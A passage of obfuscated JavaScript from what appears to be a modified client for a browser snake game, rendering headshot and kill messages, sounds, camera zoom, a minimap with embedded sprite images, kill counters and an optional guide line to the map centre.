              _0x11d42a = _0x2df280((1 - _0x9cb6e3) * 1 + _0x9cb6e3 * 0.96, (1 - _0x9cb6e3) * 1 + _0x9cb6e3 * 0.82, (1 - _0x9cb6e3) * 1 + _0x9cb6e3 * 0);
            } else if (_0x229f49 < 300) {
              var _0x22ce55 = (_0x229f49 - 30) / 270;
              _0x11d42a = _0x2df280((1 - _0x22ce55) * 0.96 + _0x22ce55 * 0.93, (1 - _0x22ce55) * 0.82 + _0x22ce55 * 0.34, (1 - _0x22ce55) * 0 + _0x22ce55 * 0.25);
            } else if (_0x229f49 < 700) {
              var _0x36ec24 = (_0x229f49 - 300) / 400;
              _0x11d42a = _0x2df280((1 - _0x36ec24) * 0.93 + _0x36ec24 * 0.98, (1 - _0x36ec24) * 0.34 + _0x36ec24 * 0, (1 - _0x36ec24) * 0.25 + _0x36ec24 * 0.98);
            } else {
              _0x11d42a = 16318713;
            }
            ;
            var _0xf3a36a = _0x331039.ma();
            var _0x71d0d1 = 1 + _0x331039.ma() * 0.5;
            return new _0x43db08(_0x31739d, _0x11d42a, true, 0.5, _0x2dcd66, _0xf3a36a, _0x71d0d1);
          }(_0x325627);
          this.addChild(_0x1dd156);
          this.Sg.push(_0x1dd156);
        }
      };
      window.playMonsterSound = function () {
        if (_0x207b06.vh || _0x207b06.soundEnabled) {
          const _0x4c1cf2 = document.getElementById("s_h");
          if (_0x4c1cf2) {
            _0x4c1cf2.pause();
            _0x4c1cf2.currentTime = 0;
          }
          const _0x486616 = document.getElementById("monster_kill_sound");
          if (_0x486616) {
            _0x486616.volume = (_0x207b06.soundVolume || 50) / 100;
            _0x486616.currentTime = 0;
            _0x486616.play().catch(_0x1de22a => {});
          }
        }
      };
      _0x4f0900.prototype.Vg = function (_0x971d58, _0x43c4c2) {
        _0x623736(_0x207b06, oeo, "count", _0x971d58);
        if (_0x971d58 && _0x207b06.vh) {
          if (_0x207b06.headshot % 10 === 0 && _0x207b06.headshot > 0) {
            if (typeof window.playMonsterSound === "function") {
              window.playMonsterSound();
            } else {
              const _0xcc8d47 = document.getElementById("monster_kill_sound");
              if (_0xcc8d47) {
                _0xcc8d47.volume = (_0x207b06.soundVolume || 50) / 100;
                _0xcc8d47.currentTime = 0;
                _0xcc8d47.play().catch(_0x20c47e => {});
              }
            }
          } else {
            window.playHeadshotSound();
          }
        }
        if (_0x971d58) {
          var _0x32d7cc = "";
          if (_0x207b06.iq) {
            _0x32d7cc = "HEADSHOT 🚬";
            var _0x53e3e2 = _0x48a691(_0x32d7cc, true);
            this.addChild(_0x53e3e2);
            this.Sg.push(_0x53e3e2);
          } else {
            if (_0x207b06.headshotMsgType === "custom" && _0x207b06.headshotCustomText) {
              _0x32d7cc = _0x207b06.headshotCustomText;
            } else if (_0x207b06.headshotMsg) {
              _0x32d7cc = _0x207b06.headshotMsg;
            } else {
              _0x32d7cc = _0x331039.U("index.game.floating.headshot");
            }
            var _0x1fc56f = _0x32d7cc;
            if (_0x207b06.showHeadshotName !== false && _0x43c4c2) {
              if (_0x207b06.headshotNamePos === "before") {
                _0x1fc56f = _0x43c4c2 + " " + _0x32d7cc;
              } else {
                _0x1fc56f = _0x32d7cc + " " + _0x43c4c2;
              }
            }
            var _0x53e3e2 = _0x48a691(_0x1fc56f, true);
            this.addChild(_0x53e3e2);
            this.Sg.push(_0x53e3e2);
          }
        } else {
          var _0x32d7cc = "";
          if (_0x207b06.iq) {
            _0x32d7cc = "WellDone!!🔨";
            var _0x43b3c6 = _0x48a691(_0x32d7cc, false);
            this.addChild(_0x43b3c6);
            this.Sg.push(_0x43b3c6);
          } else {
            if (_0x207b06.killMsgType === "custom" && _0x207b06.killCustomText) {
              _0x32d7cc = _0x207b06.killCustomText;
            } else if (_0x207b06.killMsg) {
              _0x32d7cc = _0x207b06.killMsg;
            } else {
              _0x32d7cc = _0x331039.U("index.game.floating.wellDone");
            }
            var _0x1fc56f = _0x32d7cc;
            if (_0x207b06.showKillName !== false && _0x43c4c2) {
              if (_0x207b06.killNamePos === "before") {
                _0x1fc56f = _0x43c4c2 + " " + _0x32d7cc;
              } else {
                _0x1fc56f = _0x32d7cc + " " + _0x43c4c2;
              }
            }
            var _0x43b3c6 = _0x48a691(_0x1fc56f, false);
            this.addChild(_0x43b3c6);
            this.Sg.push(_0x43b3c6);
          }
        }
      };
      _0x4f0900.prototype.Bg = function (_0x40864a, _0x2b7f51) {
        var _0x788718 = ooo.Xg.Kf.Wg;
        var _0x3e2d4d = _0x788718.Vf.width / _0x788718.Vf.resolution;
        var _0x33f2c3 = _0x788718.Vf.height / _0x788718.Vf.resolution;
        for (var _0x5d196e = 0; _0x5d196e < this.Sg.length;) {
          var _0x4709eb = this.Sg[_0x5d196e];
          _0x4709eb.Yg = _0x4709eb.Yg + _0x2b7f51 / 2000 * _0x4709eb.Zg;
          _0x4709eb.$g = _0x4709eb.$g + _0x2b7f51 / 2000 * _0x4709eb._g;
          _0x4709eb.alpha = _0x331039.oa(_0x494ea6.T * _0x4709eb.$g) * 0.5;
          _0x4709eb.scale.set(_0x4709eb.Yg);
          _0x4709eb.position.x = _0x3e2d4d * (0.25 + _0x4709eb.ah * 0.5);
          _0x4709eb.position.y = _0x4709eb.bh ? _0x33f2c3 * (1 - (1 + _0x4709eb.$g) * 0.5) : _0x33f2c3 * (1 - (0 + _0x4709eb.$g) * 0.5);
          if (_0x4709eb.$g > 1) {
            _0x4ead11.k.F.G(_0x4709eb);
            this.Sg.splice(_0x5d196e, 1);
            _0x5d196e--;
          }
          _0x5d196e++;
        }
      };
      var _0x43db08 = _0x331039.ca(_0x4ead11.k.t, function (_0x3caf7c, _0x123ae4, _0x362433, _0x5e4d04, _0x3c8870, _0x58651e, _0xe3659d) {
        _0x4ead11.k.t.call(this, _0x3caf7c, {
          fill: _0x123ae4,
          fontFamily: "PTSans",
          fontSize: 36
        });
        this.anchor.set(0.5);
        this.bh = _0x362433;
        this.Yg = _0x5e4d04;
        this.Zg = _0x3c8870;
        this.ah = _0x58651e;
        this.$g = 0;
        this._g = _0xe3659d;
      });
      return _0x4f0900;
    }();
    _0x7f096e.Ke = function _0x296911(_0x297478, _0xbc1b62) {
      this.Ee = _0x297478;
      this.Za = _0xbc1b62;
    };
    _0x7f096e.jd = {
      ch: 0,
      id: 16
    };
    _0x7f096e.dh = function () {
      function _0x59f43e() {
        this.eh = _0x7f096e.jd.ch;
        this.fh = 0;
        this.gh = 500;
        this.hh = 4000;
        this.ih = 7000;
      }
      _0x59f43e.jh = 0;
      _0x59f43e.prototype.kh = function () {
        return this.gh * 1.02;
      };
      return _0x59f43e;
    }();
    _0x7f096e.lh = function () {
      function _0x276411(_0x1d40d6) {
        var _0x1c99a3;
        this.Of = _0x1d40d6;
        this.nc = _0x1d40d6.get()[0];
        this.Vf = ((_0x1c99a3 = {}).view = this.nc, _0x1c99a3.backgroundColor = _0x2a5c95, _0x1c99a3.antialias = true, new _0x4ead11.k.o(_0x1c99a3));
        this.Wf = new _0x4ead11.k.l();
        this.Wf.sortableChildren = true;
        this.mh = _0x331039._(_0x331039.ma());
        this.nh = 0;
        this.oh = 0;
        this.ph = 15;
        this.qh = 0.5;
        this.rh = 0;
        this.sh = new _0x7f096e.th();
        this.uh = new _0x4ead11.k.p();
        this.vh = new _0x4ead11.k.l();
        this.wh = new _0x4ead11.k.l();
        this.wh.sortableChildren = true;
        this.xh = new _0x4ead11.k.l();
        this.yh = new _0x4ead11.k.l();
        this.yh.sortableChildren = true;
        this.zh = new _0x4ead11.k.l();
        this.Ah = new _0x3f88df();
        this.Bh = new _0x7c3bac();
        this.Ch = new _0x2a006();
        this.Dh = new _0x7f096e.Rg();
        this.Eh = new _0x4ead11.k.s();
        this.Fh = {
          x: 0,
          y: 0
        };
        this.Sa();
      }
      var _0x10a4ad;
      var _0x39b4ca;
      var _0x2b9d4b;
      var _0x3aa975;
      var _0x5c891c;
      var _0x2a5c95 = 0;
      _0x276411.prototype.Sa = function () {
        this.Vf.backgroundColor = _0x2a5c95;
        this.sh._f.zIndex = 10;
        this.Wf.addChild(this.sh._f);
        this.uh.zIndex = 20;
        this.Wf.addChild(this.uh);
        this.vh.zIndex = 5000;
        this.Wf.addChild(this.vh);
        this.wh.zIndex = 5100;
        this.Wf.addChild(this.wh);
        this.xh.zIndex = 10000;
        this.Wf.addChild(this.xh);
        this.Eh.texture = ooo.ef.Gh;
        this.Eh.anchor.set(0.5);
        this.Eh.zIndex = 1;
        this.yh.addChild(this.Eh);
        this.zh.alpha = 0.6;
        this.zh.zIndex = 2;
        this.yh.addChild(this.zh);
        this.Dh.zIndex = 3;
        this.yh.addChild(this.Dh);
        this.Ah.alpha = 0.8;
        this.Ah.zIndex = 4;
        this.yh.addChild(this.Ah);
        this.Bh.zIndex = 5;
        this.yh.addChild(this.Bh);
        this.Ch.zIndex = 6;
        this.yh.addChild(this.Ch);
        this.qg();
      };
      _0x276411.prototype.qg = function () {
        var _0x5b6507 = _0x331039.e();
        var _0x52ceb9 = this.Of.width();
        var _0x78d263 = this.Of.height();
        this.Vf.resize(_0x52ceb9, _0x78d263);
        this.Vf.resolution = _0x5b6507;
        this.nc.width = _0x5b6507 * _0x52ceb9;
        this.nc.height = _0x5b6507 * _0x78d263;
        this.qh = _0x331039.ha(_0x331039.ha(_0x52ceb9, _0x78d263), _0x331039.ia(_0x52ceb9, _0x78d263) * 0.625);
        this.Eh.position.x = _0x52ceb9 / 2;
        this.Eh.position.y = _0x78d263 / 2;
        this.Eh.width = _0x52ceb9;
        this.Eh.height = _0x78d263;
        this.Ah.addChild(ctx.pointsContainer);
        this.Ah.position.x = _0x207b06.sc == 0 ? 60 : _0x52ceb9 / 2 + 60 - _0x52ceb9 * _0x207b06.wi;
        this.Ah.position.y = 60;
        this.Bh.position.x = _0x207b06.sc == 0 ? 110 : _0x52ceb9 / 2 + 110 - _0x52ceb9 * _0x207b06.wi;
        this.Bh.position.y = 10;
        this.Ch.position.x = _0x207b06.sc == 0 ? _0x52ceb9 - 225 : _0x52ceb9 / 2 - 225 + _0x52ceb9 * _0x207b06.wi;
        this.Ch.position.y = 1;
      };
      _0x276411.prototype.Bg = function (_0x17236e, _0x499625) {
        this.ph = 15;
        this.vh.removeChildren();
        this.wh.removeChildren();
        this.xh.removeChildren();
        this.zh.removeChildren();
        this.sh.Hh(_0x17236e.eh === _0x7f096e.jd.ch ? ooo.ef.F_bg : ooo.ef.Jh);
        var _0x4d3b48 = this.uh;
        _0x4d3b48.clear();
        _0x4d3b48.lineStyle(0.2, 16711680, 0.3);
        _0x4d3b48.drawCircle(0, 0, _0x17236e.gh);
        _0x4d3b48.endFill();
        this.Ch.Kh = _0x499625;
        this.zh.visible = _0x499625;
      };
      _0x276411.prototype.ug = function (_0x443dd9, _0x1a1ff6) {
        if (!(this.Vf.width <= 5)) {
          var _0x127023 = ooo.Mh.Lh;
          var _0x13ab32 = this.Vf.width / this.Vf.resolution;
          var _0x2b3b80 = this.Vf.height / this.Vf.resolution;
          this.ph = _0x331039.ga(this.ph, ooo.Mh.Nh, _0x1a1ff6, 0.002);
          this.zh.visible = _0x207b06.sn;
          var _0x2f3a46 = this.qh / (this.ph * _0x207b06.z);
          var _0x2545c9 = ooo.Mh.Lh.Nd[_0x7f096e.Pd.Zd];
          var _0x9fac75 = _0x2545c9 != null && _0x2545c9.Rd;
          this.rh = _0x331039.fa(this.rh + _0x1a1ff6 / 1000 * ((_0x9fac75 ? 1 : 0) * 0.1 - this.rh), 0, 1);
          this.Eh.alpha = this.rh;
          this.mh = this.mh + _0x1a1ff6 * 0.01;
          if (this.mh > 360) {
            this.mh = this.mh % 360;
          }
          this.nh = _0x331039.oa(_0x443dd9 / 1200 * _0x494ea6.S);
          var _0x156444 = _0x127023.Oh();
          this.Fh.x = _0x331039.ja(this.Fh.x, _0x156444._a, _0x1a1ff6, _0x207b06.smoothCamera, 33.333);
          this.Fh.y = _0x331039.ja(this.Fh.y, _0x156444.ab, _0x1a1ff6, 0.5, 33.333);
          var _0x223745 = _0x13ab32 / _0x2f3a46 / 2;
          var _0x542fc1 = _0x2b3b80 / _0x2f3a46 / 2;
          ooo.Mh.Ph(this.Fh.x - _0x223745 * 1.3, this.Fh.x + _0x223745 * 1.3, this.Fh.y - _0x542fc1 * 1.3, this.Fh.y + _0x542fc1 * 1.3);
          this.sh.Bg(this.Fh.x, this.Fh.y, _0x223745 * 2, _0x542fc1 * 2);
          var _0x3a05b8 = ooo.Mh.Qh.gh;
          this.Wf.scale.x = _0x2f3a46;
          this.Wf.scale.y = _0x2f3a46;
          this.Wf.position.x = _0x13ab32 / 2 - this.Fh.x * _0x2f3a46;
          this.Wf.position.y = _0x2b3b80 / 2 - this.Fh.y * _0x2f3a46;
          window.coords = {
            playerX: this.Ah.Sh.position.x,
            playerY: this.Ah.Sh.position.y
          };
          if (_0x207b06.ls) {
            if (!window.laserGraphics) {
              window.laserGraphics = new PIXI.Graphics();
              window.laserGraphics.zIndex = 20;
              this.Wf.addChild(window.laserGraphics);
            }
            window.laserGraphics.visible = true;
            window.laserGraphics.clear();
            window.laserGraphics.lineStyle(window.laserOptions.thickness, window.laserOptions.color, window.laserOptions.opacity);
            window.laserGraphics.moveTo(_0x156444._a, _0x156444.ab);
            window.laserGraphics.lineTo(0, 0);
            window.laserGraphics.endFill();
          } else if (window.laserGraphics) {
            window.laserGraphics.visible = false;
          }
          var _0x1ab34f = _0x331039.la(_0x156444._a, _0x156444.ab);
          if (_0x1ab34f > _0x3a05b8 - 10) {
            this.oh = _0x331039.fa(1 + (_0x1ab34f - _0x3a05b8) / 10, 0, 1);
            var _0x5b48f1 = _0x331039.pa(this.mh * _0x494ea6.S / 360) * (1 - this.oh) + this.oh * 1;
            var _0x510b16 = _0x331039.oa(this.mh * _0x494ea6.S / 360) * (1 - this.oh);
            var _0x5c98ef = (_0x331039.ta(_0x510b16, _0x5b48f1) + _0x494ea6.S) % _0x494ea6.S * 360 / _0x494ea6.S;
            var _0x20b257 = this.oh * (0.5 + this.nh * 0.5);
            var _0x29e7c9 = _0x331039.za(_0x331039._(_0x5c98ef), 1, 0.75 - this.oh * 0.25);
            this.sh.nd(_0x29e7c9[0], _0x29e7c9[1], _0x29e7c9[2], 0.1 + _0x20b257 * 0.2);
          } else {
            this.oh = 0;
            var _0x12b19e = _0x331039.za(_0x331039._(this.mh), 1, 0.75);
            this.sh.nd(_0x12b19e[0], _0x12b19e[1], _0x12b19e[2], 0.1);
          }
          ;
          for (var _0x7caed4 = 0; _0x7caed4 < this.zh.children.length; _0x7caed4++) {
            var _0x257922 = this.zh.children[_0x7caed4];
            _0x257922.position.x = _0x13ab32 / 2 - (this.Fh.x - _0x257922.Rh.x) * _0x2f3a46;
            _0x257922.position.y = _0x2b3b80 / 2 - (this.Fh.y - _0x257922.Rh.y) * _0x2f3a46;
          }
          ;
          this.Ah.Sh.position.x = _0x156444._a / _0x3a05b8 * this.Ah.Th;
          this.Ah.Sh.position.y = _0x156444.ab / _0x3a05b8 * this.Ah.Th;
          this.Bh.Uh(_0x443dd9);
          this.Dh.Bg(_0x443dd9, _0x1a1ff6);
          this.Vf.render(this.Wf, null, true);
          this.Vf.render(this.yh, null, false);
        }
      };
      _0x276411.prototype.Vh = function (_0x1340a5, _0x5c308f) {
        _0x5c308f.Wh.ld.zd().zIndex = (_0x1340a5 + 2147483648) / 4294967296 * 5000;
        this.vh.addChild(_0x5c308f.Wh.md.zd());
        this.wh.addChild(_0x5c308f.Wh.ld.zd());
      };
      _0x276411.prototype.Xh = function (_0x220f06, _0x180f4e, _0xe3d7af) {
        _0x180f4e.Yc.zIndex = ooo.Mh.Qh.fh ? 0 : 10 + (_0x220f06 + 32768) / 65536 * 5000;
        if (_0x5c2dcc.n != null && _0x5c2dcc.n.Je == _0x220f06) {
          _0x5c2dcc.uj = _0x180f4e;
          this.xh.addChild(_0x5c2dcc.uj.Yc);
        } else {
          this.xh.addChild(_0x180f4e.Yc);
        }
        if (_0x220f06 !== ooo.Mh.Qh.fh) {
          this.zh.addChild(_0xe3d7af);
        }
      };
      var _0x3f88df = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.Th = 40;
        this.Yh = new _0x4ead11.k.s();
        this.Yh.anchor.set(0.5);
        this.Sh = new _0x4ead11.k.p();
        var _0x4d595 = _0x41ed0b.offsetWidth;
        var _0x285c1e = _0x41ed0b.offsetHeight;
        var _0x57722e = new _0x4ead11.k.p();
        _0x57722e.beginFill("black", 0.4);
        _0x57722e.drawCircle(0, 0, this.Th);
        _0x57722e.endFill();
        _0x57722e.lineStyle(2, 16225317);
        _0x57722e.drawCircle(0, 0, this.Th);
        _0x57722e.moveTo(0, -this.Th);
        _0x57722e.lineTo(0, +this.Th);
        _0x57722e.moveTo(-this.Th, 0);
        _0x57722e.lineTo(+this.Th, 0);
        _0x57722e.endFill();
        this.Yh.alpha = 0.5;
        this.Sh.zIndex = 99999;
        this.Sh.alpha = 0.9;
        this.Sh.beginFill(16225317);
        this.Sh.drawCircle(0, 0, this.Th * 0.1);
        this.Sh.endFill();
        this.Sh.lineStyle(1, "black");
        this.Sh.drawCircle(0, 0, this.Th * 0.1);
        this.Sh.endFill();
        this.addChild(_0x57722e);
        this.addChild(ctx.pointsContainer);
        this.addChild(this.Yh);
        this.addChild(this.Sh);
        {
          this.img_clock = PIXI.Sprite.from(atob(_0x56e2a2[8]));
          this.img_clock.width = 100;
          this.img_clock.height = 100;
          this.img_clock.x = -50;
          this.img_clock.y = -50;
          this.addChild(this.img_clock);
          if (_0x2964bf()) {
            this.img_1 = PIXI.Sprite.from(atob(_0x56e2a2[9]));
            this.img_1.width = 80;
            this.img_1.height = 40;
            this.img_1.x = -100 + _0x4d595 * 0.5;
            this.img_1.y = -60;
            this.img_1.visible = _0x207b06.mo == 1 && _0x5c2dcc.on;
            this.addChild(this.img_1);
            this.img_2 = PIXI.Sprite.from(atob(_0x56e2a2[10]));
            this.img_2.width = 80;
            this.img_2.height = 40;
            this.img_2.x = -100 + _0x4d595 * 0.5;
            this.img_2.y = -60;
            this.img_2.visible = _0x207b06.mo == 2;
            this.addChild(this.img_2);
            this.img_3 = PIXI.Sprite.from(atob(_0x56e2a2[11]));
            this.img_3.width = 80;
            this.img_3.height = 40;
            this.img_3.x = -100 + _0x4d595 * 0.5;
            this.img_3.y = -60;
            this.img_3.visible = _0x207b06.mo == 3;
            this.addChild(this.img_3);
            this.img_4 = PIXI.Sprite.from(atob(_0x56e2a2[12]));
            this.img_4.width = 80;
            this.img_4.height = 40;
            this.img_4.x = -100 + _0x4d595 * 0.5;
            this.img_4.y = -60;
            this.img_4.visible = _0x207b06.mo == 4;
            this.addChild(this.img_4);
            this.img_f = PIXI.Sprite.from(atob(_0x56e2a2[13]));
            this.img_f.width = 80;
            this.img_f.height = 80;
            this.img_f.x = -60;
            this.img_f.y = -60;
            this.img_f.visible = false;
            this.addChild(this.img_f);
            this.img_o_2 = PIXI.Sprite.from(atob(_0x56e2a2[14]));
            this.img_o_2.width = 100;
            this.img_o_2.height = 100;
            this.img_o_2.x = 15;
            this.img_o_2.y = -210 + _0x285c1e;
            this.img_o_2.visible = _0x207b06.mo == 2;
            this.img_o_2.alpha = 0.25;
            this.addChild(this.img_o_2);
            this.img_o_3 = PIXI.Sprite.from(atob(_0x56e2a2[15]));
            this.img_o_3.width = 100;
            this.img_o_3.height = 100;
            this.img_o_3.x = 15;
            this.img_o_3.y = -210 + _0x285c1e;
            this.img_o_3.visible = _0x207b06.mo == 3;
            this.img_o_3.alpha = 0.25;
            this.addChild(this.img_o_3);
            this.img_o_4 = PIXI.Sprite.from(atob(_0x56e2a2[16]));
            this.img_o_4.width = 100;
            this.img_o_4.height = 100;
            this.img_o_4.x = 15;
            this.img_o_4.y = -210 + _0x285c1e;
            this.img_o_4.visible = _0x207b06.mo == 4;
            this.addChild(this.img_o_4);
            this.img_i_2 = PIXI.Sprite.from(atob(_0x56e2a2[17]));
            this.img_i_2.width = 50;
            this.img_i_2.height = 50;
            this.img_i_2.x = 40;
            this.img_i_2.y = -185 + _0x285c1e;
            this.img_i_2.visible = _0x207b06.mo == 2;
            this.img_i_2.alpha = 0.25;
            this.addChild(this.img_i_2);
            this.img_i_3 = PIXI.Sprite.from(atob(_0x56e2a2[18]));
            this.img_i_3.width = 50;
            this.img_i_3.height = 50;
            this.img_i_3.x = 40;
            this.img_i_3.y = -185 + _0x285c1e;
            this.img_i_3.visible = _0x207b06.mo == 3;
            this.img_i_3.alpha = 0.25;
            this.addChild(this.img_i_3);
            this.img_p_1 = PIXI.Sprite.from(atob(_0x56e2a2[19]));
            this.img_p_1.width = 16;
            this.img_p_1.height = 16;
            this.img_p_1.x = -68 + _0x4d595 * 0.5;
            this.img_p_1.y = -68 + _0x285c1e * 0.5;
            this.img_p_1.visible = _0x207b06.mo == 1 && _0x5c2dcc.on;
            this.img_p_1.alpha = 0.25;
            this.addChild(this.img_p_1);
            this.img_pf_1 = PIXI.Sprite.from(atob(_0x56e2a2[20]));
            this.img_pf_1.width = 16;
            this.img_pf_1.height = 16;
            this.img_pf_1.x = -68 + _0x4d595 * 0.5;
            this.img_pf_1.y = -68 + _0x285c1e * 0.5;
            this.img_pf_1.visible = false;
            this.img_pf_1.alpha = 1;
            this.addChild(this.img_pf_1);
            this.img_p_2 = PIXI.Sprite.from(atob(_0x56e2a2[21]));
            this.img_p_2.width = 16;
            this.img_p_2.height = 16;
            this.img_p_2.x = -68 + _0x4d595 * 0.5;
            this.img_p_2.y = -68 + _0x285c1e * 0.5;
            this.img_p_2.visible = _0x207b06.mo == 2;
            this.img_p_2.alpha = 0.25;
            this.addChild(this.img_p_2);
            this.img_p_3 = PIXI.Sprite.from(atob(_0x56e2a2[22]));
            this.img_p_3.width = 16;
            this.img_p_3.height = 16;
            this.img_p_3.x = -68 + _0x4d595 * 0.5;
            this.img_p_3.y = -68 + _0x285c1e * 0.5;
            this.img_p_3.visible = _0x207b06.mo == 3;
            this.img_p_3.alpha = 0.25;
            this.addChild(this.img_p_3);
          }
          b = new PIXI.TextStyle({
            align: "center",
            fill: "#f8d968",
            fontSize: 12,
            lineJoin: "round",
            stroke: "red",
            strokeThickness: 1,
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x127073 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 12,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x546489 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x2422f8 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x1ce00e = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x2e7581 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x3ff660 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x5128b2 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          let _0x51a573 = new PIXI.TextStyle({
            align: "center",
            fill: "#fff",
            fontSize: 20,
            lineJoin: "round",
            stroke: "#FFF",
            whiteSpace: "normal",
            wordWrap: true
          });
          this.pk0 = new PIXI.Text("", _0x546489);
          this.pk1 = new PIXI.Text("", _0x2422f8);
          this.pk2 = new PIXI.Text("", _0x1ce00e);
          this.pk3 = new PIXI.Text("", _0x2e7581);
          this.pk4 = new PIXI.Text("", _0x3ff660);
          this.pk5 = new PIXI.Text("", _0x5128b2);
          this.pk6 = new PIXI.Text("", _0x51a573);
          this.pk0.x = 60;
          this.pk1.x = 100;
          this.pk2.x = 140;
          this.pk3.x = 180;
          this.pk4.x = 220;
          this.pk5.x = 260;
          this.pk6.x = 300;
          this.pk0.y = -12;
          this.pk1.y = -12;
          this.pk2.y = -12;
          this.pk3.y = -12;
          this.pk4.y = -12;
          this.pk5.y = -12;
          this.pk6.y = -12;
          this.addChild(this.pk0);
          this.addChild(this.pk1);
          this.addChild(this.pk2);
          this.addChild(this.pk3);
          this.addChild(this.pk4);
          this.addChild(this.pk5);
          this.addChild(this.pk6);
          this.container_count = new PIXI.Container();
          this.container_count.x = -45;
          this.container_count.y = -52;
          this.label_hs = new PIXI.Text("HS", b);
          this.value1_hs = new PIXI.Text("0", b);
          this.value2_hs = new PIXI.Text("0", b);
          this.label_kill = new PIXI.Text("KILL", _0x127073);
          this.value1_kill = new PIXI.Text("0", _0x127073);
          this.value2_kill = new PIXI.Text("0", _0x127073);
          this.label_hs.x = 25;
          this.label_hs.y = 107;
          this.label_hs.anchor.x = 0.5;
          this.label_kill.x = 75;
          this.label_kill.y = 107;
          this.label_kill.anchor.x = 0.5;
          this.value1_hs.x = 25;
          this.value1_hs.y = 120;
          this.value1_hs.anchor.x = 0.5;
          this.value1_kill.x = 75;
          this.value1_kill.y = 120;
          this.value1_kill.anchor.x = 0.5;
          this.value2_hs.x = 25;
          this.value2_hs.y = 133;
          this.value2_hs.anchor.x = 0.5;
          this.value2_kill.x = 75;
          this.value2_kill.y = 133;
          this.value2_kill.anchor.x = 0.5;
          if (!_0x207b06.saveGame) {
            this.value2_hs.alpha = 0;
            this.value2_kill.alpha = 0;
          }
          this.container_count.addChild(this.label_hs);
          this.container_count.addChild(this.value1_hs);
          this.container_count.addChild(this.value2_hs);
          this.container_count.addChild(this.label_kill);
          this.container_count.addChild(this.value1_kill);
          this.container_count.addChild(this.value2_kill);
          this.addChild(this.container_count);
        }
      });
      (_0x10a4ad = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.Zh = {};
      })).prototype.Uh = function (_0x259717) {
        var _0x4f9f00 = 0.5 + _0x331039.pa(_0x494ea6.S * (_0x259717 / 1000 / 1.6)) * 0.5;
        for (var _0x3a87f3 in this.Zh) {
          var _0x1c2d97 = this.Zh[_0x3a87f3];
          var _0x545dfd = _0x1c2d97.$h;
          _0x1c2d97.alpha = 1 - _0x545dfd + _0x545dfd * _0x4f9f00;
        }
      };
      _0x10a4ad.prototype.Bg = function (_0x503f99) {
        for (var _0x48e5f0 in this.Zh) {
          if (_0x503f99[_0x48e5f0] == null || !_0x503f99[_0x48e5f0].Rd) {
            _0x4ead11.k.F.G(this.Zh[_0x48e5f0]);
            delete this.Zh[_0x48e5f0];
          }
        }
        ;
        var _0x4f2a98 = 0;
        for (var _0x3295e1 in _0x503f99) {
          var _0x26a4f0 = _0x503f99[_0x3295e1];
          if (_0x26a4f0.Rd) {
            var _0x5607e1 = this.Zh[_0x3295e1];
            if (!_0x5607e1) {
              var _0x3f3fd9 = ooo.ud.Cc().$b(_0x26a4f0.Wd).dc;
              (_0x5607e1 = new _0x39b4ca()).texture = _0x3f3fd9.nb();
              _0x5607e1.width = 40;
              _0x5607e1.height = 40;
              this.Zh[_0x3295e1] = _0x5607e1;
              this.addChild(_0x5607e1);
            }
            ;
            if (_0x5c2dcc.on) {
              if (!_0x207b06.hz || !_0x207b06.mobile || !_0x207b06.tt) {
                _0x1c7046(_0x207b06, oeo, "show", _0x4f2a98, _0x26a4f0.Wd, _0x26a4f0.Xd);
              }
            }
            _0x5607e1.$h = _0x26a4f0.Xd;
            if (_0x207b06.hz && _0x207b06.mobile && _0x207b06.tt) {
              if (_0x4f2a98 == 0 || _0x4f2a98 == 40 || _0x4f2a98 == 80 || _0x4f2a98 == 120) {
                _0x5607e1.position.x = 0;
                _0x5607e1.position.y = _0x4f2a98 + 10;
              }
              if (_0x4f2a98 == 160) {
                _0x5607e1.position.x = -40;
                _0x5607e1.position.y = 130;
              }
              if (_0x4f2a98 == 200) {
                _0x5607e1.position.x = -80;
                _0x5607e1.position.y = 130;
              }
              if (_0x4f2a98 == 240) {
                _0x5607e1.position.x = -120;
                _0x5607e1.position.y = 130;
              }
            } else {
              _0x5607e1.position.x = _0x4f2a98;
            }
            _0x4f2a98 += 40;
          }
        }
      };
      _0x39b4ca = _0x331039.ca(_0x4ead11.k.s, function () {
        _0x4ead11.k.s.call(this);
        this.$h = 0;
      });
      var _0x7c3bac = _0x10a4ad;
      (_0x2b9d4b = _0x331039.ca(_0x4ead11.k.l, function () {
        _0x4ead11.k.l.call(this);
        this.Kh = true;
        this._h = 12;
        this.ai = 9;
        this.Sg = [];
        for (var _0x142255 = 0; _0x142255 < 14; _0x142255++) {
          this.bi();
        }
      })).prototype.Bg = function (_0x548b6d) {
        if (_0x5c2dcc.on) {
          if (_0x207b06.tt) {
            this.addChild(_0xfa7e1);
            this.addChild(_0x2e32b4);
            if (_0x207b06.hz && _0x207b06.mobile) {
              var _0x10131c = _0x41ed0b.offsetHeight;
              _0xfa7e1.x = 205;
              _0xfa7e1.y = _0x10131c / 2 - 58 + 10;
              _0x2e32b4.x = 205;
              _0x2e32b4.y = _0x10131c / 2 - 28 + 10;
              _0xb5f074.x = 205;
              _0xb5f074.y = _0x10131c / 2 + 3 + 10;
              _0x1e6f48.x = 205;
              _0x1e6f48.y = _0x10131c / 2 + 33 + 10;
              this.addChild(_0xb5f074);
              this.addChild(_0x1e6f48);
